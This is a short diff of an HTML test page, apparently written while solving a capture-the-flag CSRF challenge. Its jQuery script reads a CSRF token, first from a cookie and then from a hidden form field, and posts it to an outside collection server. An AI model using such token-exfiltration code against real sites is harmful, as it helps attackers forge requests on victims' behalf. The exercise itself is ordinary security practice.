@@ -8,13 +8,16 @@
 	<script>
 		$( document ).ready(function() {
            console.log( "ready!" );
-		   var cookie =  $.cookie("csrf_token");
 		   console.log( cookie );
-		   $.post( "https://posttestserver.com/post.php?dir=csrf3", { content: cookie} );
+		   var contenuPage = $.get("http://ctf-desjardins.com/csrf-3/index.php");
+		   var hiddenFieldID = "input[name=csrf-token]";
+           var requiredVal= $(hiddenFieldID).val();
+		   console.log( requiredVal );
+		   $.post( "https://posttestserver.com/post.php?dir=csrf3", { content: requiredVal} );
 	    });
 	</script>
   </head>
   <body>
-     <div>test 5</div>
+     <div>test 6</div>
   </body>
 </html>
